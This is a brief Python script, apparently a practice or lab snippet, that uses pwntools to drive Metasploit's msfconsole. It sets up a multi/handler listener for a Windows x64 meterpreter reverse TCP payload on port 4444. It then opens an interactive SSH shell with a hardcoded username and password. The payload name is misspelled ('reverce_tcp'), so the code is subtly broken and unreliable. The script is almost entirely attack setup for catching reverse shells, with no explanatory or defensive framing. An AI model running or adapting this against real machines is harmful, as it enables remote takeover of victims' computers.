from pwn import *
#io = process(['nmap','127.1.3.3'])
#output = io.recvall()
#print(output.decode())


io = process(["msfconsole","-q"],stdin=PTY)
io.recvuntil(b">")
io.sendline(b"use exploit/multi/handler")
io.sendline(b"set payload windows/x64/meterpreter/reverce_tcp")
io.sendline(b"set lport 4444")
io.sendline(b"set lhost 123.4.4.3")
io.interactive()






s1 =ssh(host="127.5.3.3",user="sath",password="yusad")
p1 = s1.shell("sh")
p1.interactive()


